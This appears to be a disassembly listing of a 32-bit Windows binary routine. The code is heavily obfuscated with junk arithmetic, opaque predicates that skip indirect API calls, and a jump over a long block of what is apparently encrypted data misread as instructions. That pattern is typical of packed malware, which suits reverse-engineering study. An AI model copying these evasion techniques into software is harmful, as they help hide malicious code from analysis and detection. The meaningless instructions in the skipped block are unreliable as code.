  41f8c3:	mov    DWORD PTR [ebp-0x118],0x6083
  41f8cd:	or     DWORD PTR ds:0x428267,ebx
  41f8d3:	mov    DWORD PTR [ebp-0x88],0x556
  41f8dd:	mov    DWORD PTR [ebp-0x140],0x6c7d
  41f8e7:	mov    eax,DWORD PTR [ebp-0x140]
  41f8ed:	add    eax,0x5af8
  41f8f2:	xor    DWORD PTR ds:0x42837b,0x37e5
  41f8fc:	mov    ecx,DWORD PTR [ebp-0x88]
  41f902:	sub    DWORD PTR ds:0x428163,0x42839f
  41f90c:	sub    eax,ecx
  41f90e:	dec    DWORD PTR ds:0x428277
  41f914:	mov    ecx,DWORD PTR [ebp-0x118]
  41f91a:	lea    eax,[eax+ecx*1+0x68dc]
  41f921:	or     eax,0x52f6
  41f926:	adc    ecx,DWORD PTR ds:0x42822f
  41f92c:	sub    eax,0x1dbfe
  41f931:	mov    DWORD PTR [ebp-0xac],eax
  41f937:	cmp    DWORD PTR ds:0x4282f3,0x0
  41f93e:	mov    DWORD PTR ds:0x428303,0x63c0
  41f948:	mov    DWORD PTR ds:0x428193,0x2316
  41f952:	mov    ecx,0x40fd
  41f957:	jmp    0x41f99f
  41f95c:	mov    eax,ds:0x42829f
  41f961:	mov    eax,0x5fd6
  41f966:	cmp    DWORD PTR ds:0x4282f3,0x0
  41f96d:	je     0x41f98d
  41f973:	call   DWORD PTR ds:0x428eb0
  41f979:	sbb    DWORD PTR ds:0x4283a3,0x209
  41f983:	xor    DWORD PTR ds:0x428393,0x72db
  41f98d:	add    ecx,ecx
  41f98f:	and    DWORD PTR ds:0x42828f,0x6064
  41f999:	or     ecx,0x4aaa
  41f99f:	mov    DWORD PTR [ebp-0x6c],0x4b56
  41f9a6:	mov    DWORD PTR [ebp-0x100],0x49f7
  41f9b0:	xor    ecx,eax
  41f9b2:	mov    eax,DWORD PTR [ebp-0x100]
  41f9b8:	movzx  ecx,WORD PTR ds:0x428193
  41f9bf:	or     DWORD PTR ds:0x42837f,ecx
  41f9c5:	add    eax,0x7b60
  41f9ca:	cmp    DWORD PTR ds:0x4282f7,0x0
  41f9d1:	mov    DWORD PTR ds:0x42823b,0x756d
  41f9db:	mov    DWORD PTR ds:0x4282f3,0x1d60
  41f9e5:	jmp    0x41fa41
  41f9ea:	mov    ecx,DWORD PTR ds:0x4282fb
  41f9f0:	cmp    DWORD PTR ds:0x4282f7,0x0
  41f9f7:	jg     0x41fa21
  41f9fd:	push   0x59e0
  41fa02:	call   DWORD PTR ds:0x428e34
  41fa08:	adc    DWORD PTR ds:0x42838f,ebx
  41fa0e:	sbb    DWORD PTR ds:0x428313,ebx
  41fa14:	movzx  ecx,WORD PTR ds:0x42836b
  41fa1b:	add    DWORD PTR ds:0x42837b,ecx
  41fa21:	add    DWORD PTR ds:0x428373,0x77eb
  41fa2b:	or     DWORD PTR ds:0x4282f3,0x2dfb
  41fa35:	mov    ecx,DWORD PTR ds:0x42829f
  41fa3b:	and    DWORD PTR ds:0x42815f,ecx
  41fa41:	imul   eax,eax,0x5ea
  41fa47:	mov    ecx,DWORD PTR [ebp-0x6c]
  41fa4a:	add    DWORD PTR ds:0x42824b,0x42818b
  41fa54:	imul   eax,ecx
  41fa57:	xor    edx,edx
  41fa59:	mov    ecx,0x3218d
  41fa5e:	div    ecx
  41fa60:	or     DWORD PTR ds:0x428293,edx
  41fa66:	sub    eax,0x24c1
  41fa6b:	mov    DWORD PTR [ebp-0xa8],eax
  41fa71:	cmp    DWORD PTR ds:0x428277,0x0
  41fa78:	mov    ecx,0x571f
  41fa7d:	mov    DWORD PTR ds:0x428307,edi
  41fa83:	jmp    0x41faef
  41fa88:	mov    eax,ds:0x428197
  41fa8d:	mov    DWORD PTR ds:0x42818f,0x4079
  41fa97:	cmp    DWORD PTR ds:0x428277,0x0
  41fa9e:	jb     0x41fac8
  41faa4:	push   0x428083
  41faa9:	push   DWORD PTR [ebp-0xc]
  41faac:	call   DWORD PTR ds:0x428e38
  41fab2:	adc    ecx,ecx
  41fab4:	dec    ecx
  41fab5:	movzx  ecx,BYTE PTR ds:0x428153
  41fabc:	sbb    ecx,DWORD PTR ds:0x42824b
  41fac2:	mov    DWORD PTR ds:0x428153,ecx
  41fac8:	xor    DWORD PTR ds:0x42829b,edx
  41face:	movzx  ecx,WORD PTR ds:0x428253
  41fad5:	or     DWORD PTR ds:0x4282eb,ecx
  41fadb:	xor    ecx,ecx
  41fadd:	add    ecx,DWORD PTR ds:0x42837b
  41fae3:	add    DWORD PTR ds:0x42828f,ecx
  41fae9:	and    ecx,DWORD PTR ds:0x42816b
  41faef:	mov    DWORD PTR [ebp-0x84],0x2c40
  41faf9:	cmp    DWORD PTR ds:0x42819b,0x0
  41fb00:	mov    ecx,DWORD PTR ds:0x4282ff
  41fb06:	mov    DWORD PTR ds:0x428383,edx
  41fb0c:	mov    DWORD PTR ds:0x42815f,ebx
  41fb12:	mov    DWORD PTR ds:0x428307,0x3231
  41fb1c:	jmp    0x41fb72
  41fb21:	not    eax
  41fb23:	cmp    DWORD PTR ds:0x42819b,0x0
  41fb2a:	jne    0x41fb54
  41fb30:	push   0x4d84
  41fb35:	push   0x8040
  41fb3a:	call   DWORD PTR ds:0x428e3c
  41fb40:	and    ecx,ecx
  41fb42:	mov    ecx,DWORD PTR ds:0x4283a3
  41fb48:	or     ecx,DWORD PTR ds:0x428273
  41fb4e:	mov    DWORD PTR ds:0x4283a3,ecx
  41fb54:	mov    ecx,DWORD PTR ds:0x42816b
  41fb5a:	add    ecx,DWORD PTR ds:0x4283a3
  41fb60:	mov    DWORD PTR ds:0x42816b,ecx
  41fb66:	sbb    DWORD PTR ds:0x42828b,ecx
  41fb6c:	adc    ecx,DWORD PTR ds:0x42829f
  41fb72:	mov    DWORD PTR [ebp-0x18],0x6013
  41fb79:	xor    ecx,DWORD PTR ds:0x42824f
  41fb7f:	mov    DWORD PTR [ebp-0x80],0xc
  41fb86:	or     DWORD PTR ds:0x428257,ecx
  41fb8c:	mov    eax,DWORD PTR [ebp-0x18]
  41fb8f:	sub    DWORD PTR ds:0x42818f,edi
  41fb95:	mov    ecx,DWORD PTR [ebp-0x80]
  41fb98:	or     DWORD PTR ds:0x428287,0x42828b
  41fba2:	xor    edx,edx
  41fba4:	xor    DWORD PTR ds:0x42839b,0x428303
  41fbae:	div    ecx
  41fbb0:	imul   eax,eax,0x4312
  41fbb6:	add    eax,0x5abe
  41fbbb:	cmp    DWORD PTR ds:0x42836f,0x0
  41fbc2:	mov    DWORD PTR ds:0x42819b,ebx
  41fbc8:	mov    DWORD PTR ds:0x4283a7,0x6142
  41fbd2:	jmp    0x41fc37
  41fbd7:	mov    DWORD PTR ds:0x428277,0x13f4
  41fbe1:	mov    DWORD PTR ds:0x428177,0x47aa
  41fbeb:	cmp    DWORD PTR ds:0x42836f,0x0
  41fbf2:	jne    0x41fc15
  41fbf8:	push   0x4280df
  41fbfd:	call   DWORD PTR ds:0x428e40
  41fc03:	and    ecx,DWORD PTR ds:0x428263
  41fc09:	adc    DWORD PTR ds:0x4282f3,ecx
  41fc0f:	sub    DWORD PTR ds:0x4282fb,edi
  41fc15:	mov    ecx,DWORD PTR ds:0x42836b
  41fc1b:	sbb    ecx,DWORD PTR ds:0x42822b
  41fc21:	mov    DWORD PTR ds:0x42836b,ecx
  41fc27:	and    DWORD PTR ds:0x428313,0x55d2
  41fc31:	add    DWORD PTR ds:0x42818f,ecx
  41fc37:	mov    ecx,DWORD PTR [ebp-0x84]
  41fc3d:	adc    DWORD PTR ds:0x42827f,0x1028
  41fc47:	xor    eax,ecx
  41fc49:	or     ecx,DWORD PTR ds:0x42828f
  41fc4f:	xor    edx,edx
  41fc51:	or     ecx,DWORD PTR ds:0x42815b
  41fc57:	mov    ecx,0x5ae
  41fc5c:	sub    DWORD PTR ds:0x428277,0x4356
  41fc66:	div    ecx
  41fc68:	cmp    DWORD PTR ds:0x42822f,0x0
  41fc6f:	mov    ecx,0x1d02
  41fc74:	mov    DWORD PTR ds:0x428293,ebx
  41fc7a:	mov    DWORD PTR ds:0x4282a7,0x2746
  41fc84:	mov    DWORD PTR ds:0x428277,edx
  41fc8a:	jmp    0x41fcee
  41fc8f:	mov    DWORD PTR ds:0x42816b,0x6e43
  41fc99:	cmp    DWORD PTR ds:0x42822f,0x0
  41fca0:	jbe    0x41fccb
  41fca6:	push   0x29e8
  41fcab:	push   0x54b0
  41fcb0:	push   DWORD PTR [ebp-0x28]
  41fcb3:	call   DWORD PTR ds:0x428eb4
  41fcb9:	neg    ecx
  41fcbb:	sbb    ecx,DWORD PTR ds:0x4283a3
  41fcc1:	and    DWORD PTR ds:0x42816b,0x42831f
  41fccb:	mov    ecx,DWORD PTR ds:0x428173
  41fcd1:	xor    DWORD PTR ds:0x42823f,ecx
  41fcd7:	movzx  ecx,BYTE PTR ds:0x428287
  41fcde:	sub    DWORD PTR ds:0x428393,ecx
  41fce4:	mov    DWORD PTR ds:0x428243,0x7a81
  41fcee:	xor    eax,0x5e8c
  41fcf3:	adc    ecx,0x10d9
  41fcf9:	mov    DWORD PTR [ebp-0x48],eax
  41fcfc:	mov    DWORD PTR [ebp-0x13c],0x7b18
  41fd06:	mov    eax,ds:0x4283a7
  41fd0b:	add    eax,DWORD PTR ds:0x42816f
  41fd11:	mov    ds:0x4283a7,eax
  41fd16:	mov    DWORD PTR [ebp-0x138],0x1169
  41fd20:	xor    ecx,ecx
  41fd22:	mov    DWORD PTR [ebp-0x12c],0x1379
  41fd2c:	cmp    DWORD PTR ds:0x428313,0x0
  41fd33:	mov    ecx,DWORD PTR ds:0x4282fb
  41fd39:	mov    ecx,DWORD PTR ds:0x42838b
  41fd3f:	mov    ecx,0x2973
  41fd44:	movzx  ecx,WORD PTR ds:0x42822b
  41fd4b:	jmp    0x41fd9c
  41fd50:	mov    eax,0x21a8
  41fd55:	mov    eax,0x38ee
  41fd5a:	cmp    DWORD PTR ds:0x428313,0x0
  41fd61:	ja     0x41fd84
  41fd67:	push   DWORD PTR [ebp-0x20]
  41fd6a:	call   DWORD PTR ds:0x428e44
  41fd70:	and    ecx,ecx
  41fd72:	xor    DWORD PTR ds:0x428273,0x6e97
  41fd7c:	add    ecx,ecx
  41fd7e:	or     DWORD PTR ds:0x42824f,edx
  41fd84:	mov    ecx,DWORD PTR ds:0x4282b3
  41fd8a:	mov    ecx,DWORD PTR [ecx]
  41fd8c:	sbb    DWORD PTR ds:0x42829f,ecx
  41fd92:	sbb    DWORD PTR ds:0x428393,0x42831b
  41fd9c:	mov    eax,DWORD PTR [ebp-0x12c]
  41fda2:	mov    ecx,0x5856
  41fda7:	sub    ecx,eax
  41fda9:	shr    ecx,0x2
  41fdac:	sub    ecx,0x5be6
  41fdb2:	xor    eax,0xe7a
  41fdb7:	mov    eax,DWORD PTR [ebp-0x138]
  41fdbd:	imul   ecx,eax
  41fdc0:	mov    eax,DWORD PTR [ebp-0x13c]
  41fdc6:	sbb    DWORD PTR ds:0x42830f,0x428313
  41fdd0:	and    ecx,eax
  41fdd2:	xor    DWORD PTR ds:0x42817f,edx
  41fdd8:	mov    eax,0x3b18
  41fddd:	sub    eax,ecx
  41fddf:	mov    DWORD PTR [ebp-0xfc],eax
  41fde5:	mov    DWORD PTR [ebp-0x28],0x16d7
  41fdec:	mov    DWORD PTR [ebp-0x134],0x6b4
  41fdf6:	sub    eax,DWORD PTR ds:0x42836f
  41fdfc:	mov    eax,DWORD PTR [ebp-0x134]
  41fe02:	xor    ecx,0x2b1a
  41fe08:	or     eax,0x4f70
  41fe0d:	xor    ecx,ecx
  41fe0f:	add    ecx,DWORD PTR ds:0x42836f
  41fe15:	xor    DWORD PTR ds:0x428377,ecx
  41fe1b:	mov    ecx,DWORD PTR [ebp-0x28]
  41fe1e:	or     eax,ecx
  41fe20:	sub    eax,0x5ff7
  41fe25:	mov    DWORD PTR [ebp-0xc8],eax
  41fe2b:	adc    eax,ecx
  41fe2d:	mov    DWORD PTR [ebp-0xe4],0x5f39
  41fe37:	sub    ecx,ecx
  41fe39:	mov    DWORD PTR [ebp-0xc4],0x6236
  41fe43:	mov    DWORD PTR [ebp-0x7c],0x6ce7
  41fe4a:	cmp    DWORD PTR ds:0x42816f,0x0
  41fe51:	not    DWORD PTR ds:0x42829b
  41fe57:	mov    DWORD PTR ds:0x428237,edx
  41fe5d:	jmp    0x41feb6
  41fe62:	mov    eax,0x4320
  41fe67:	cmp    DWORD PTR ds:0x42816f,0x0
  41fe6e:	jne    0x41fe8d
  41fe74:	push   DWORD PTR [ebp-0x28]
  41fe77:	call   DWORD PTR ds:0x428e48
  41fe7d:	and    DWORD PTR ds:0x428387,0x4195
  41fe87:	add    ecx,DWORD PTR ds:0x42823f
  41fe8d:	movzx  ecx,WORD PTR ds:0x428317
  41fe94:	and    DWORD PTR ds:0x4282f3,ecx
  41fe9a:	and    DWORD PTR ds:0x428267,edx
  41fea0:	add    ecx,0x2485
  41fea6:	mov    eax,ds:0x4281ab
  41feab:	mov    ecx,DWORD PTR ds:0x4283df
  41feb1:	sub    ecx,eax
  41feb3:	and    eax,DWORD PTR [eax+ecx*1]
  41feb6:	mov    DWORD PTR [ebp-0x128],0x7537
  41fec0:	not    ecx
  41fec2:	mov    DWORD PTR [ebp-0x114],0x6985
  41fecc:	movzx  ecx,BYTE PTR ds:0x42818f
  41fed3:	or     DWORD PTR ds:0x4283a3,ecx
  41fed9:	mov    DWORD PTR [ebp-0x14],0x5627
  41fee0:	cmp    DWORD PTR ds:0x42826b,0x0
  41fee7:	mov    ecx,0x306f
  41feec:	mov    DWORD PTR ds:0x42836f,0x1b86
  41fef6:	jmp    0x41ff30
  41fefb:	mov    eax,0x6a49
  41ff00:	mov    DWORD PTR ds:0x4282eb,ecx
  41ff06:	cmp    DWORD PTR ds:0x42826b,0x0
  41ff0d:	jae    0x41ff28
  41ff13:	push   0x428153
  41ff18:	call   DWORD PTR ds:0x428eb8
  41ff1e:	or     ecx,DWORD PTR ds:0x428173
  41ff24:	and    ecx,ecx
  41ff26:	adc    ecx,ecx
  41ff28:	adc    DWORD PTR ds:0x428317,ecx
  41ff2e:	sbb    ecx,ecx
  41ff30:	mov    DWORD PTR [ebp-0x64],0x72e7
  41ff37:	mov    eax,DWORD PTR [ebp-0x14]
  41ff3a:	and    DWORD PTR ds:0x42823b,edi
  41ff40:	add    eax,DWORD PTR [ebp-0x64]
  41ff43:	jmp    0x42029f
  41ff48:	test   DWORD PTR [edx],edi
  41ff4a:	cmp    BYTE PTR [eax+0x2e],ah
  41ff4d:	pop    edx
  41ff4e:	cmp    eax,0x6ff09f1a
  41ff53:	mov    al,0x9b
  41ff55:	dec    esp
  41ff56:	xchg   ebp,eax
  41ff57:	mov    esp,0x18162323
  41ff5c:	mov    ds:0x79181812,eax
  41ff61:	or     al,0xfe
  41ff63:	fbstp  TBYTE PTR [ebx]
  41ff65:	scas   eax,DWORD PTR es:[edi]
  41ff66:	lods   al,BYTE PTR ds:[esi]
  41ff67:	(bad)  
  41ff68:	sbb    DWORD PTR [ecx],ebx
  41ff6a:	sub    edx,esp
  41ff6c:	loopne 0x41ffca
  41ff6e:	jbe    0x41ffcd
  41ff70:	lods   al,BYTE PTR ds:[esi]
  41ff71:	inc    edx
  41ff72:	rcl    bl,cl
  41ff74:	mov    DWORD PTR [edi-0x2b5b2ac1],edi
  41ff7a:	sbb    bl,BYTE PTR [eax+0x2efdb75c]
  41ff80:	or     eax,0xf2a1d692
  41ff85:	inc    ebp
  41ff86:	popa   
  41ff87:	pop    esp
  41ff88:	in     al,0xf2
  41ff8a:	adc    BYTE PTR [ebp+0x6c],cl
  41ff8d:	add    esi,DWORD PTR [edi]
  41ff8f:	mov    ch,dl
  41ff91:	not    DWORD PTR [ecx]
  41ff93:	pop    ecx
  41ff94:	outs   dx,DWORD PTR ds:[esi]
  41ff95:	adc    al,bl
  41ff97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff98:	xchg   esp,eax
  41ff99:	aaa    
  41ff9a:	daa    
  41ff9b:	add    dl,dl
  41ff9d:	push   0xe
  41ff9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffa0:	push   ebp
  41ffa1:	jo     0x41ff72
  41ffa3:	cmp    DWORD PTR [edi+0x5f94dbcd],ebx
  41ffa9:	ficom  DWORD PTR [edx]
  41ffab:	mov    cl,0x61
  41ffad:	out    dx,eax
  41ffae:	inc    esi
  41ffaf:	push   0xc998808e
  41ffb4:	cli    
  41ffb5:	(bad)  [ebx+0x33084fa2]
  41ffbb:	cmp    edx,ecx
  41ffbd:	push   ebp
  41ffbe:	xchg   ecx,eax
  41ffbf:	pushf  
  41ffc0:	(bad)  
  41ffc1:	mov    ch,0x40
  41ffc3:	test   DWORD PTR [ecx-0x32ec882f],esp
  41ffc9:	enter  0x5ef8,0xa6
  41ffcd:	enter  0xabba,0xd5
  41ffd1:	lods   al,BYTE PTR ds:[esi]
  41ffd2:	dec    ebx
  41ffd3:	mov    ds:0x9decbfad,al
  41ffd8:	dec    edx
  41ffd9:	or     al,0xd2
  41ffdb:	dec    eax
  41ffdc:	push   ecx
  41ffdd:	daa    
  41ffde:	imul   eax,edi,0x54
  41ffe1:	mov    ah,0x79
  41ffe3:	mov    al,0x55
  41ffe5:	pop    edi
  41ffe6:	ss mov eax,0x75620cfa
  41ffec:	mov    eax,DWORD PTR [ecx-0x60]
  41ffef:	add    DWORD PTR [ebx],ebp
  41fff1:	jnp    0x42004b
  41fff3:	(bad)  
  41fff4:	and    edi,DWORD PTR [edx]
  41fff6:	gs fs ja 0x42001f
  41fffa:	out    0xf6,al
  41fffc:	fsubr  QWORD PTR [esi]
  41fffe:	shl    DWORD PTR [ebp-0x1bbfff26],0x68
  420005:	ficom  DWORD PTR [edi-0x6d]
  420008:	cmp    al,0xf3
  42000a:	adc    esp,esp
  42000c:	(bad)  
  42000d:	hlt    
  42000e:	xor    dl,cl
  420010:	pop    ebp
  420011:	call   0xd5d8d7e5
  420016:	bound  ebx,QWORD PTR [esi]
  420018:	int    0x1b
  42001a:	xor    eax,0x9192a94c
  42001f:	mov    cl,0x18
  420021:	scas   al,BYTE PTR es:[edi]
  420022:	cmp    al,0x25
  420024:	push   0x70
  420026:	icebp  
  420027:	daa    
  420028:	push   edx
  420029:	pop    esi
  42002a:	dec    esi
  42002b:	xor    dl,al
  42002d:	imul   ebp,DWORD PTR [eax-0x62],0x63
  420031:	cmp    BYTE PTR [edx],cl
  420033:	retf   0x483
  420036:	xchg   edi,eax
  420037:	push   0x38212b6f
  42003c:	inc    esp
  42003d:	mov    cl,BYTE PTR [ecx]
  42003f:	mov    esp,0x29df589a
  420044:	stos   BYTE PTR es:[edi],al
  420045:	dec    edi
  420046:	in     eax,0xc0
  420048:	push   ebx
  420049:	mov    dh,0x63
  42004b:	jmp    0x979e:0xb585bd4
  420052:	inc    edi
  420053:	sahf   
  420054:	jbe    0x42004b
  420056:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420057:	loop   0x420054
  420059:	push   0xef4a6732
  42005e:	jg     0x420071
  420060:	lea    ecx,[esi]
  420062:	jae    0x41ffeb
  420064:	(bad)  
  420065:	xchg   esp,eax
  420066:	xor    eax,0xf6e1fa80
  42006b:	add    BYTE PTR [esi+0xadfc72e],al
  420071:	stc    
  420072:	stc    
  420073:	out    0xbd,al
  420075:	adc    edi,DWORD PTR [eax]
  420077:	cmp    al,0xfb
  420079:	outs   dx,BYTE PTR ds:[esi]
  42007a:	jnp    0x420015
  42007c:	mov    edi,0xa7e153a
  420081:	jge    0x42007b
  420083:	shl    DWORD PTR [ebx-0xb038a65],cl
  420089:	jns    0x4200eb
  42008b:	test   eax,0x567a303e
  420090:	lods   al,BYTE PTR ds:[esi]
  420091:	out    0xa2,eax
  420093:	cdq    
  420094:	mov    BYTE PTR [edi-0x1f],cl
  420097:	mov    ds:0x8edace9f,al
  42009c:	mov    dl,0x11
  42009e:	cmp    esp,eax
  4200a0:	mov    ecx,0x69a8bd3f
  4200a5:	adc    ah,BYTE PTR [esi+edx*2+0x383f8a27]
  4200ac:	push   cs
  4200ad:	in     al,0x6c
  4200af:	inc    esi
  4200b0:	jo     0x42010c
  4200b2:	jle    0x4200b3
  4200b4:	(bad)  
  4200b5:	xchg   esi,eax
  4200b6:	rcr    ecx,0xf8
  4200b9:	cmp    esp,DWORD PTR [ebp-0x3b]
  4200bc:	jo     0x4200ed
  4200be:	cwde   
  4200bf:	sar    DWORD PTR [ebp+0x4d],1
  4200c2:	mov    eax,ds:0xbd7b56d0
  4200c7:	or     eax,DWORD PTR [ecx]
  4200c9:	cld    
  4200ca:	out    dx,al
  4200cb:	or     al,dl
  4200cd:	cmc    
  4200ce:	gs sbb eax,0xbe61b8a8
  4200d4:	(bad)  
  4200d5:	ins    DWORD PTR es:[edi],dx
  4200d6:	pusha  
  4200d7:	dec    edi
  4200d8:	leave  
  4200d9:	jns    0x420090
  4200db:	sbb    BYTE PTR [esi+0x7a4bb22d],bh
  4200e1:	bound  esi,QWORD PTR [ecx-0xb]
  4200e4:	jp     0x4200e3
  4200e6:	shl    DWORD PTR [edx],0x3d
  4200e9:	ja     0x42007f
  4200eb:	push   0xfffffff4
  4200ed:	or     edi,DWORD PTR [eax+0x36cc938e]
  4200f3:	clc    
  4200f4:	cld    
  4200f5:	push   esp
  4200f6:	outs   dx,BYTE PTR ds:[esi]
  4200f7:	das    
  4200f8:	imul   esi,DWORD PTR [edx*8-0x620c6b32],0xbd53d563
  420103:	dec    eax
  420104:	pop    edx
  420105:	jge    0x420148
  420107:	cmp    BYTE PTR [ebp-0x64e84020],bh
  42010d:	add    cl,BYTE PTR [ebx]
  42010f:	push   ebp
  420110:	xor    al,BYTE PTR [esp+ecx*2-0x3d]
  420114:	(bad)  
  420116:	mov    esi,0x3faf0fde
  42011b:	not    DWORD PTR [ebp+0x58b7fc00]
  420121:	adc    ecx,DWORD PTR [esp+edi*1-0x4f]
  420125:	inc    eax
  420126:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420127:	retf   
  420128:	mov    bh,0x8d
  42012a:	mov    DWORD PTR [ebp-0x15],edx
  42012d:	nop
  42012e:	fldcw  WORD PTR [ecx+0x3f]
  420131:	retf   
  420132:	cmp    eax,0x240a4b53
  420137:	dec    eax
  420138:	sbb    eax,eax
  42013a:	call   0x118a:0xccd53a6a
  420141:	xchg   BYTE PTR [ebx+0x7d],dl
  420144:	adc    BYTE PTR [ebx-0x1f],bl
  420147:	mov    ch,0x11
  420149:	mov    eax,ds:0x3f7d24eb
  42014e:	jae    0x4201cc
  420150:	xchg   edx,eax
  420151:	jno    0x420120
  420153:	push   edx
  420154:	cmp    DWORD PTR [edi],0x57b5559d
  42015a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42015b:	cmc    
  42015c:	cmp    bh,BYTE PTR [edi-0x4f2f0774]
  420162:	and    eax,0xf23ab0a8
  420167:	cmp    bh,bl
  420169:	jl     0x42015c
  42016b:	dec    edx
  42016c:	pop    ecx
  42016d:	mov    ch,0xf2
  42016f:	lods   al,BYTE PTR ds:[esi]
  420170:	aaa    
  420171:	mov    edx,0x4f4b42da
  420176:	cs mov esi,0x79316346
  42017c:	xlat   BYTE PTR ds:[ebx]
  42017d:	xor    esp,DWORD PTR [ebx]
  42017f:	inc    ebp
  420180:	pushf  
  420181:	aas    
  420182:	fidivr WORD PTR [edi-0x71]
  420185:	pop    ss
  420186:	rol    BYTE PTR [eax-0x76],cl
  420189:	mov    BYTE PTR [esi+0x4157988b],dl
  42018f:	or     eax,0x31adf92d
  420194:	xor    eax,0x1f48eb37
  420199:	mov    al,cl
  42019b:	mov    al,ds:0xd24b4fdf
  4201a0:	pop    ecx
  4201a1:	or     ch,BYTE PTR [edi+eiz*2-0x13ca71fe]
  4201a8:	push   esi
  4201a9:	xchg   BYTE PTR [eax],al
  4201ab:	inc    ebx
  4201ac:	push   ebx
  4201ad:	or     eax,0x7e0177fa
  4201b2:	shl    BYTE PTR [ebp+0xc53c91b],cl
  4201b8:	sbb    al,0xfa
  4201ba:	mov    eax,ds:0x8130062e
  4201bf:	xchg   ebp,eax
  4201c0:	xchg   ebx,eax
  4201c1:	jge    0x420227
  4201c3:	mov    al,0x50
  4201c5:	js     0x42023b
  4201c7:	sbb    ch,BYTE PTR [edi]
  4201c9:	retf   
  4201ca:	and    al,BYTE PTR [ebx-0x52]
  4201cd:	ret    0x6386
  4201d0:	call   0xb72216
  4201d5:	mov    bl,0x25
  4201d7:	test   DWORD PTR [ecx],edi
  4201d9:	and    DWORD PTR [ecx-0x17da636c],0x26d2453a
  4201e3:	mov    cl,0x15
  4201e5:	shl    BYTE PTR [eax],1
  4201e7:	or     WORD PTR [ebx+esi*2-0x43],sp
  4201ec:	sub    DWORD PTR [edi],ebp
  4201ee:	stos   DWORD PTR es:[edi],eax
  4201ef:	in     eax,dx
  4201f0:	add    BYTE PTR [edi],0x96
  4201f3:	push   edi
  4201f4:	pop    edi
  4201f5:	or     al,al
  4201f7:	stos   BYTE PTR es:[edi],al
  4201f8:	pop    ds
  4201f9:	or     edx,DWORD PTR [edi-0x3e10ce92]
  4201ff:	les    ebp,FWORD PTR [ebx+0x76c85a6e]
  420205:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420206:	lods   al,BYTE PTR ds:[esi]
  420208:	in     al,0xdc
  42020a:	mov    cl,dl
  42020c:	into   
  42020d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42020e:	dec    esp
  42020f:	inc    esp
  420210:	add    al,0x5b
  420212:	test   DWORD PTR [edi],ecx
  420214:	pusha  
  420215:	test   BYTE PTR [ebp+0x53],0x65
  420219:	rcl    ecx,cl
  42021b:	ds loop 0x420274
  42021e:	pop    ss
  42021f:	cld    
  420220:	mov    ecx,0x747708a4
  420225:	out    dx,al
  420226:	or     edi,DWORD PTR [ecx]
  420228:	loopne 0x420202
  42022a:	fstp   st(5)
  42022c:	inc    ebp
  42022d:	addr16 leave 
  42022f:	iret   
  420230:	or     BYTE PTR [ebx+0x2d],bl
  420233:	jnp    0x42025e
  420235:	sbb    bh,BYTE PTR [esi]
  420237:	xchg   edx,eax
  420238:	or     eax,0xb76b527d
  42023d:	lds    ebx,FWORD PTR [edx-0x1ffa4acb]
  420243:	jns    0x42020d
  420245:	push   ebx
  420246:	outs   dx,BYTE PTR ds:[esi]
  420247:	dec    ebx
  420248:	cmp    BYTE PTR [edx-0x29fa70b3],ch
  42024e:	out    dx,al
  42024f:	add    DWORD PTR [edi-0x5b4a85a8],0x6f
  420256:	shl    DWORD PTR [esi-0x301c5411],1
  42025c:	push   es
  42025d:	sbb    eax,DWORD PTR [ebx-0x2d]
  420260:	mov    ds:0xd608325e,eax
  420265:	mov    esp,0xdb274bb4
  42026a:	push   edx
  42026b:	(bad)  
  42026c:	fwait
  42026d:	dec    esi
  42026e:	pop    ds
  42026f:	in     eax,dx
  420270:	xchg   ecx,eax
  420271:	stos   BYTE PTR es:[edi],al
  420272:	mov    al,BYTE PTR [ecx+edx*4+0x34]
  420276:	mov    ebx,0x36e4d05f
  42027b:	xlat   BYTE PTR ds:[ebx]
  42027c:	dec    edx
  42027d:	pop    DWORD PTR [edx]
  42027f:	test   al,0x2b
  420281:	(bad)  
  420282:	out    dx,eax
  420283:	popf   
  420284:	adc    BYTE PTR [ecx+esi*2-0x67],ch
  420288:	sbb    esp,DWORD PTR [ebx+0x647d9846]
  42028e:	mov    al,ds:0x69c02fd8
  420293:	popf   
  420294:	fdiv   QWORD PTR [esi-0x4b]
  420297:	fs jne 0x4202cb
  42029a:	jno    0x420316
  42029c:	je     0x4202e2
  42029e:	mov    ecx,DWORD PTR ds:[ebp-0x114]
  4202a5:	or     DWORD PTR ds:0x42828f,0x42830b
  4202af:	sub    eax,ecx
  4202b1:	mov    ecx,DWORD PTR ds:0x428387
  4202b7:	add    DWORD PTR ds:0x42830f,ecx
  4202bd:	mov    ecx,DWORD PTR [ebp-0x128]
  4202c3:	imul   eax,ecx
  4202c6:	imul   eax,eax,0xe4e
  4202cc:	mov    ecx,DWORD PTR [ebp-0x7c]
  4202cf:	or     eax,ecx
  4202d1:	and    DWORD PTR ds:0x42838b,ebx
  4202d7:	mov    ecx,DWORD PTR [ebp+0x8]
  4202da:	sub    DWORD PTR ds:0x428167,0x428287
  4202e4:	lea    eax,[ecx+eax*1+0x46210209]
  4202eb:	add    DWORD PTR ds:0x42837b,0x42815f
  4202f5:	push   eax
  4202f6:	add    DWORD PTR ds:0x428273,0x42822b
  420300:	call   0x414116
  420305:	cmp    DWORD PTR ds:0x42830b,0x0
  42030c:	mov    DWORD PTR ds:0x428263,edx
  420312:	mov    esi,DWORD PTR ds:0x42822b
  420318:	mov    DWORD PTR ds:0x428307,ebx
  42031e:	mov    DWORD PTR ds:0x428317,0x5564
  420328:	jmp    0x420388
  42032d:	mov    DWORD PTR ds:0x428183,0x3019
  420337:	not    DWORD PTR ds:0x42830b
  42033d:	cmp    DWORD PTR ds:0x42830b,0x0
  420344:	jae    0x42036f
  42034a:	push   DWORD PTR [ebp-0x24]
  42034d:	push   0x42836b
  420352:	push   DWORD PTR [ebp-0x1c]
  420355:	push   DWORD PTR [ebp-0xc]
  420358:	push   0x6e6a
  42035d:	call   DWORD PTR ds:0x428ebc
  420363:	adc    ecx,DWORD PTR ds:0x428243
  420369:	xor    DWORD PTR ds:0x4282ff,edx
  42036f:	add    ecx,esi
  420371:	mov    ecx,DWORD PTR ds:0x42821b
  420377:	mov    esi,DWORD PTR ds:0x4282d3
  42037d:	sub    esi,ecx
  42037f:	and    ecx,DWORD PTR [ecx+esi*1]
